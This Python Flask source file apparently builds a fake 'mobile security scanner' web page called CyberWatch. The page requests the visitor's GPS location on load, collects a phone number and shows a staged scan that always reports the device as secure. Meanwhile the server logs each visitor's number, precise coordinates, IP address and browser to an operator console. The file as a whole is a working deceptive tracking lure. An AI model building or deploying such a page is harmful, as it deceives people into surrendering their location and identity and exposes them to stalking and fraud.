from flask import Flask, render_template_string, request, jsonify
import time
from datetime import datetime

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberWatch - Mobile Security Scanner</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Orbitron', sans-serif;
            background: #0a0a0a;
            color: #00ff41;
            overflow-x: hidden;
            min-height: 100vh;
            position: relative;
        }
        
        /* Animated background grid */
        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridScroll 20s linear infinite;
            z-index: 0;
        }
        
        @keyframes gridScroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(50px); }
        }
        
        /* Glowing orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.3;
            animation: float 6s ease-in-out infinite;
            z-index: 0;
        }
        
        .orb-1 {
            width: 300px;
            height: 300px;
            background: #ff00ff;
            top: 10%;
            left: 10%;
            animation-delay: 0s;
        }
        
        .orb-2 {
            width: 400px;
            height: 400px;
            background: #00ffff;
            bottom: 10%;
            right: 10%;
            animation-delay: 2s;
        }
        
        .orb-3 {
            width: 250px;
            height: 250px;
            background: #ff00ff;
            top: 50%;
            right: 20%;
            animation-delay: 4s;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -30px) scale(1.1); }
            66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 50px;
            animation: fadeInDown 1s ease-out;
        }
        
        .logo {
            font-size: 3.5em;
            font-weight: 900;
            background: linear-gradient(45deg, #00ff41, #00ffff, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
            margin-bottom: 10px;
            animation: glowPulse 2s ease-in-out infinite;
        }
        
        @keyframes glowPulse {
            0%, 100% { filter: brightness(1); }
            50% { filter: brightness(1.3); }
        }
        
        .subtitle {
            font-size: 1.2em;
            color: #00ffff;
            letter-spacing: 3px;
            text-transform: uppercase;
        }
        
        .tagline {
            color: #ff00ff;
            margin-top: 10px;
            font-size: 0.9em;
        }
        
        .scanner-box {
            background: rgba(10, 10, 10, 0.8);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 
                0 0 20px rgba(0, 255, 65, 0.3),
                inset 0 0 20px rgba(0, 255, 65, 0.05);
            animation: fadeInUp 1s ease-out;
            position: relative;
            overflow: hidden;
        }
        
        .scanner-box::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #00ff41, #00ffff, #ff00ff, #00ff41);
            border-radius: 15px;
            z-index: -1;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .scanner-box:hover::before {
            opacity: 0.3;
            animation: borderGlow 3s linear infinite;
        }
        
        @keyframes borderGlow {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        
        .warning-banner {
            background: rgba(255, 0, 255, 0.1);
            border-left: 4px solid #ff00ff;
            padding: 15px;
            margin-bottom: 30px;
            border-radius: 5px;
            font-size: 0.9em;
        }
        
        .permission-banner {
            background: rgba(0, 255, 255, 0.1);
            border-left: 4px solid #00ffff;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 0.85em;
            display: none;
        }
        
        .permission-banner.show {
            display: block;
            animation: fadeIn 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .input-group {
            margin-bottom: 30px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-size: 1.1em;
            color: #00ffff;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        input[type="tel"] {
            width: 100%;
            padding: 15px 20px;
            background: rgba(0, 255, 65, 0.05);
            border: 2px solid #00ff41;
            border-radius: 10px;
            color: #00ff41;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1em;
            transition: all 0.3s;
            outline: none;
        }
        
        input[type="tel"]:focus {
            background: rgba(0, 255, 65, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
            transform: translateY(-2px);
        }
        
        input[type="tel"]::placeholder {
            color: rgba(0, 255, 65, 0.3);
        }
        
        .location-status {
            margin-top: 10px;
            padding: 10px;
            background: rgba(0, 255, 255, 0.05);
            border-radius: 8px;
            font-size: 0.9em;
            color: #00ffff;
            display: none;
        }
        
        .location-status.show {
            display: block;
        }
        
        .scan-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, #00ff41, #00ffff);
            border: none;
            border-radius: 10px;
            color: #0a0a0a;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.2em;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .scan-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.5);
        }
        
        .scan-button:active {
            transform: translateY(-1px);
        }
        
        .scan-button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.5);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .scan-button:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .scan-button span {
            position: relative;
            z-index: 1;
        }
        
        .scan-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .results-container {
            margin-top: 30px;
            display: none;
        }
        
        .scanning-animation {
            text-align: center;
            padding: 40px 20px;
        }
        
        .scanner-ring {
            width: 150px;
            height: 150px;
            margin: 0 auto 30px;
            border: 3px solid rgba(0, 255, 65, 0.2);
            border-top: 3px solid #00ff41;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .scanning-text {
            font-size: 1.2em;
            color: #00ffff;
            margin-bottom: 15px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(0, 255, 65, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00ffff);
            width: 0%;
            transition: width 0.3s;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.8);
        }
        
        .result-card {
            background: rgba(0, 255, 65, 0.05);
            border: 2px solid #00ff41;
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            animation: resultAppear 0.5s ease-out;
        }
        
        @keyframes resultAppear {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .result-icon {
            font-size: 4em;
            margin-bottom: 20px;
        }
        
        .result-number {
            font-size: 4em;
            font-weight: 900;
            background: linear-gradient(45deg, #00ff41, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }
        
        .result-text {
            font-size: 1.3em;
            color: #00ffff;
            margin-bottom: 20px;
        }
        
        .result-message {
            color: #00ff41;
            font-size: 1em;
            line-height: 1.6;
        }
        
        .scan-again {
            margin-top: 20px;
            padding: 12px 30px;
            background: transparent;
            border: 2px solid #ff00ff;
            color: #ff00ff;
            border-radius: 8px;
            font-family: 'Orbitron', sans-serif;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .scan-again:hover {
            background: #ff00ff;
            color: #0a0a0a;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 0, 255, 0.5);
        }
        
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .footer {
            text-align: center;
            margin-top: 50px;
            color: rgba(0, 255, 65, 0.5);
            font-size: 0.8em;
        }
        
        @media (max-width: 600px) {
            .logo {
                font-size: 2.5em;
            }
            
            .scanner-box {
                padding: 25px;
            }
            
            .result-number {
                font-size: 3em;
            }
        }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">⚡ CYBERWATCH ⚡</div>
            <div class="subtitle">Mobile Security Scanner</div>
            <div class="tagline">Know Who's Watching You</div>
        </div>
        
        <div class="scanner-box">
            <div class="warning-banner">
                ⚠️ <strong>SECURITY ALERT:</strong> This tool scans for unauthorized access to your mobile device. Stay vigilant.
            </div>
            
            <div class="permission-banner" id="permissionBanner">
                📍 <strong>LOCATION ACCESS:</strong> <span id="permissionStatus">Requesting location permissions...</span>
            </div>
            
            <form id="scanForm">
                <div class="input-group">
                    <label for="mobile">🔒 Enter Mobile Number</label>
                    <div class="input-wrapper">
                        <input 
                            type="tel" 
                            id="mobile" 
                            name="mobile" 
                            placeholder="+1 (555) 123-4567"
                            pattern="[0-9+\-\(\)\s]+"
                            required
                        >
                    </div>
                    <div class="location-status" id="locationStatus">
                        📍 Location: <span id="locationText">Detecting...</span>
                    </div>
                </div>
                
                <button type="submit" class="scan-button" id="scanBtn">
                    <span>🔍 INITIATE SCAN</span>
                </button>
            </form>
            
            <div class="results-container" id="resultsContainer">
                <div class="scanning-animation" id="scanningAnimation">
                    <div class="scanner-ring"></div>
                    <div class="scanning-text">SCANNING DEVICE...</div>
                    <div class="scanning-text" style="font-size: 0.9em; color: #ff00ff;">
                        <span id="scanStatus">Initializing security protocols...</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                </div>
                
                <div class="result-card" id="resultCard" style="display: none;">
                    <div class="result-icon">🛡️</div>
                    <div class="result-number" id="spyCount">0</div>
                    <div class="result-text">Members are spying on you</div>
                    <div class="result-message">
                        ✅ <strong>DEVICE SECURE</strong><br>
                        No unauthorized surveillance detected.<br>
                        Your mobile device appears to be safe.
                    </div>
                    <button class="scan-again" onclick="resetScan()">
                        🔄 SCAN AGAIN
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>🔐 Powered by CyberWatch Security Systems | Always Stay Protected</p>
        </div>
    </div>
    
    <script>
        const scanForm = document.getElementById('scanForm');
        const resultsContainer = document.getElementById('resultsContainer');
        const scanningAnimation = document.getElementById('scanningAnimation');
        const resultCard = document.getElementById('resultCard');
        const progressFill = document.getElementById('progressFill');
        const scanStatus = document.getElementById('scanStatus');
        const spyCount = document.getElementById('spyCount');
        const scanBtn = document.getElementById('scanBtn');
        const permissionBanner = document.getElementById('permissionBanner');
        const permissionStatus = document.getElementById('permissionStatus');
        const locationStatus = document.getElementById('locationStatus');
        const locationText = document.getElementById('locationText');
        
        let userLocation = null;
        
        const scanSteps = [
            'Initializing security protocols...',
            'Analyzing network connections...',
            'Scanning for surveillance apps...',
            'Checking unauthorized access...',
            'Detecting spyware signatures...',
            'Analyzing data transmissions...',
            'Finalizing security report...'
        ];
        
        // Request location permission on page load
        window.addEventListener('load', () => {
            requestLocation();
        });
        
        function requestLocation() {
            permissionBanner.classList.add('show');
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        permissionStatus.innerHTML = '✅ Location access granted';
                        permissionStatus.style.color = '#00ff41';
                        locationStatus.classList.add('show');
                        locationText.textContent = `Lat: ${userLocation.latitude.toFixed(6)}, Long: ${userLocation.longitude.toFixed(6)}`;
                        
                        setTimeout(() => {
                            permissionBanner.classList.remove('show');
                        }, 3000);
                    },
                    (error) => {
                        permissionStatus.innerHTML = '❌ Location access denied';
                        permissionStatus.style.color = '#ff00ff';
                        locationStatus.classList.add('show');
                        locationText.textContent = 'Location unavailable';
                        
                        console.error('Geolocation error:', error.message);
                    }
                );
            } else {
                permissionStatus.innerHTML = '❌ Geolocation not supported';
                permissionStatus.style.color = '#ff00ff';
                locationText.textContent = 'Location unavailable';
            }
        }
        
        scanForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const mobileNumber = document.getElementById('mobile').value;
            
            if (!mobileNumber) {
                alert('Please enter a mobile number!');
                return;
            }
            
            // Disable form and show scanning animation
            scanBtn.disabled = true;
            resultsContainer.style.display = 'block';
            scanningAnimation.style.display = 'block';
            resultCard.style.display = 'none';
            
            // Send data to server
            try {
                const response = await fetch('/scan', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        mobile: mobileNumber,
                        location: userLocation
                    })
                });
                
                const data = await response.json();
                
                // Simulate scanning process
                let progress = 0;
                let stepIndex = 0;
                
                const scanInterval = setInterval(() => {
                    progress += Math.random() * 15;
                    if (progress > 100) progress = 100;
                    
                    progressFill.style.width = progress + '%';
                    
                    if (stepIndex < scanSteps.length) {
                        scanStatus.textContent = scanSteps[stepIndex];
                        stepIndex++;
                    }
                    
                    if (progress >= 100) {
                        clearInterval(scanInterval);
                        
                        // Show results after scan completes
                        setTimeout(() => {
                            scanningAnimation.style.display = 'none';
                            resultCard.style.display = 'block';
                            spyCount.textContent = data.spy_count || '0';
                        }, 500);
                    }
                }, 600);
            } catch (error) {
                console.error('Scan error:', error);
                alert('Scan failed. Please try again.');
                resetScan();
            }
        });
        
        function resetScan() {
            resultsContainer.style.display = 'none';
            scanningAnimation.style.display = 'block';
            resultCard.style.display = 'none';
            progressFill.style.width = '0%';
            document.getElementById('mobile').value = '';
            scanBtn.disabled = false;
        }
    </script>
</body>
</html>
'''

def print_terminal_header():
    """Print a cyberpunk-style header in terminal"""
    print("\n" + "="*70)
    print("⚡ CYBERWATCH SECURITY SCANNER - MONITORING CONSOLE ⚡".center(70))
    print("="*70)
    print(f"System Active: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"Operator: bxf1001g")
    print("="*70 + "\n")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.get_json()
    mobile_number = data.get('mobile')
    location = data.get('location')
    
    # Print to terminal
    print("\n" + "-"*70)
    print("🔍 NEW SCAN INITIATED")
    print("-"*70)
    print(f"📱 Mobile Number: {mobile_number}")
    
    if location:
        print(f"📍 Location Data:")
        print(f"   ├─ Latitude:  {location.get('latitude', 'N/A')}")
        print(f"   ├─ Longitude: {location.get('longitude', 'N/A')}")
        print(f"   └─ Accuracy:  {location.get('accuracy', 'N/A')} meters")
    else:
        print(f"📍 Location: Not available")
    
    print(f"⏰ Timestamp: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"🌐 IP Address: {request.remote_addr}")
    print(f"🖥️  User Agent: {request.headers.get('User-Agent', 'Unknown')[:50]}...")
    print("-"*70)
    print("✅ Scan Status: COMPLETE - 0 threats detected")
    print("-"*70 + "\n")
    
    # Simulate scanning process
    time.sleep(0.5)
    
    # For now, always return 0 spies
    result = {
        'spy_count': 0,
        'status': 'secure',
        'message': 'No unauthorized surveillance detected.'
    }
    
    return jsonify(result)

if __name__ == '__main__':
    print_terminal_header()
    print("🚀 Starting CyberWatch Security Scanner...")
    print("📡 Server running on http://localhost:5000")
    print("🔒 Waiting for scan requests...\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
